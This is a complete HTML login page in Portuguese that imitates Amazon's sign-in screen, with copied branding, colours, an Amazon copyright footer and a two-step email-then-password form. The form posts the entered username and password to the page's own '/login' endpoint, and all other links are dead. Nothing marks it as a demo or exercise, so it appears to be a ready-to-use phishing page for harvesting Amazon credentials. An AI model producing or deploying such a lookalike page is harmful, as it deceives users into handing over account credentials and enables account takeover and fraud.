<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Iniciar sessão na Amazon</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%23FF9900' d='M42 40c-1.8 1.2-4.4 1.8-6.6 1.8-3.1 0-5.9-1.1-8-3.1-.2-.2-.5-.2-.7 0-.2.2-.2.5 0 .7 2.3 2.3 5.4 3.6 8.7 3.6 2.5 0 5.2-.7 7.2-2 .3-.2.4-.6.2-.9-.2-.3-.6-.3-.8-.1z'/><path fill='%23FF9900' d='M44.7 38c-.3-.4-.8-.5-1.2-.2-2.6 2.1-6.1 3.2-9.5 3.2-4.5 0-8.6-1.9-11.5-5-.2-.2-.5-.2-.7 0s-.2.5 0 .7c3.1 3.3 7.5 5.3 12.2 5.3 3.6 0 7.3-1.2 10.1-3.4.4-.3.5-.8.2-1.2z'/><path fill='%23232F3E' d='M24 8c-8.8 0-16 7.2-16 16s7.2 16 16 16 16-7.2 16-16-7.2-16-16-16zm7.2 23.9c-.3.3-.7.3-1 0l-6.2-5.9-6.2 5.9c-.3.3-.7.3-1 0-.3-.3-.3-.7 0-1l6.7-6.4-6.7-6.4c-.3-.3-.3-.7 0-1 .3-.3.7-.3 1 0l6.2 5.9 6.2-5.9c.3-.3.7-.3 1 0 .3.3.3.7 0 1L24.5 24l6.7 6.4c.3.3.3.8 0 1.1z'/></svg>" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: "Amazon Ember", Arial, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 40px;
    }
    
    .logo {
      margin-bottom: 20px;
    }
    
    .amazon-logo {
      font-size: 36px;
      font-weight: bold;
      color: #000;
      text-decoration: none;
      position: relative;
    }
    
    .amazon-logo::after {
      content: "";
      position: absolute;
      bottom: -5px;
      left: 5px;
      right: 10px;
      height: 3px;
      background: #ff9900;
      border-radius: 2px;
    }
    
    .container {
      width: 100%;
      max-width: 350px;
      padding: 0 20px;
    }
    
    .card {
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 20px 26px;
      background: #fff;
    }
    
    h1 {
      font-size: 28px;
      font-weight: 400;
      color: #111;
      margin-bottom: 10px;
    }
    
    .input-group {
      margin-bottom: 14px;
    }
    
    label {
      display: block;
      font-size: 13px;
      font-weight: 700;
      color: #111;
      margin-bottom: 2px;
    }
    
    input {
      width: 100%;
      padding: 8px 10px;
      font-size: 15px;
      border: 1px solid #888;
      border-radius: 3px;
      outline: none;
      transition: all 0.2s;
    }
    
    input:focus {
      border-color: #e77600;
      box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
    }
    
    button {
      width: 100%;
      padding: 10px;
      background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
      border: 1px solid #846a29;
      border-radius: 3px;
      font-size: 13px;
      cursor: pointer;
      margin-top: 10px;
    }
    
    button:hover {
      background: linear-gradient(to bottom, #f5d78e, #edb933);
    }
    
    .info-text {
      font-size: 12px;
      color: #555;
      margin-top: 16px;
      line-height: 1.5;
    }
    
    .divider {
      position: relative;
      margin: 22px 0;
      text-align: center;
      color: #767676;
      font-size: 12px;
    }
    
    .divider::before {
      content: "";
      position: absolute;
      top: 50%;
      left: 0;
      right: 0;
      height: 1px;
      background: #e7e7e7;
      z-index: 0;
    }
    
    .divider span {
      position: relative;
      background: #fff;
      padding: 0 10px;
      z-index: 1;
    }
    
    .new-customer {
      margin-top: 30px;
      text-align: center;
    }
    
    .new-customer p {
      font-size: 12px;
      color: #767676;
      margin-bottom: 8px;
    }
    
    .btn-create {
      width: 100%;
      padding: 10px;
      background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
      border: 1px solid #adb1b8;
      border-radius: 3px;
      font-size: 13px;
      cursor: pointer;
      color: #111;
      text-decoration: none;
      display: block;
      text-align: center;
    }
    
    .btn-create:hover {
      background: linear-gradient(to bottom, #e7e9ec, #d5d9dd);
    }
    
    .footer {
      margin-top: 40px;
      padding-top: 20px;
      border-top: 1px solid #e7e7e7;
      text-align: center;
      width: 100%;
      max-width: 350px;
    }
    
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 10px;
    }
    
    .footer-links a {
      color: #0066c0;
      text-decoration: none;
      font-size: 12px;
    }
    
    .footer-links a:hover {
      text-decoration: underline;
      color: #c45500;
    }
    
    .footer-text {
      font-size: 11px;
      color: #555;
    }
    
    @media (max-width: 480px) {
      .card {
        border: none;
        padding: 14px 18px;
      }
    }
  </style>
</head>
<body>
  <div class="logo">
    <a href="#" class="amazon-logo">amazon</a>
  </div>
  
  <div class="container">
    <div class="card">
      <h1>Iniciar sessão</h1>
      
      <form method="POST" action="/login">
        <div class="input-group">
          <label for="email">E-mail ou número de telemóvel</label>
          <input type="text" id="email" name="username" required />
        </div>
        
        <button type="button" onclick="showPassword()">Continuar</button>
        
        <div class="input-group" id="password-group" style="display:none; margin-top:14px;">
          <label for="password">Palavra-passe</label>
          <input type="password" id="password" name="password" />
          <button type="submit" style="margin-top:14px;">Iniciar sessão</button>
        </div>
      </form>
      
      <p class="info-text">
        Ao continuar, concorda com as <a href="#" style="color:#0066c0;">Condições de Utilização</a> e com o <a href="#" style="color:#0066c0;">Aviso de Privacidade</a> da Amazon.
      </p>
      
      <div class="divider">
        <span>Novo na Amazon?</span>
      </div>
    </div>
    
    <div class="new-customer">
      <a href="#" class="btn-create">Criar a sua conta Amazon</a>
    </div>
    
    <div class="footer">
      <div class="footer-links">
        <a href="#">Condições de utilização</a>
        <a href="#">Aviso de privacidade</a>
        <a href="#">Ajuda</a>
      </div>
      <p class="footer-text">© 1996-2024, Amazon.com, Inc. ou suas afiliadas</p>
    </div>
  </div>
  
  <script>
    function showPassword() {
      const email = document.getElementById('email').value;
      if (email) {
        document.getElementById('password-group').style.display = 'block';
        document.getElementById('password').required = true;
      }
    }
  </script>
</body>
</html>
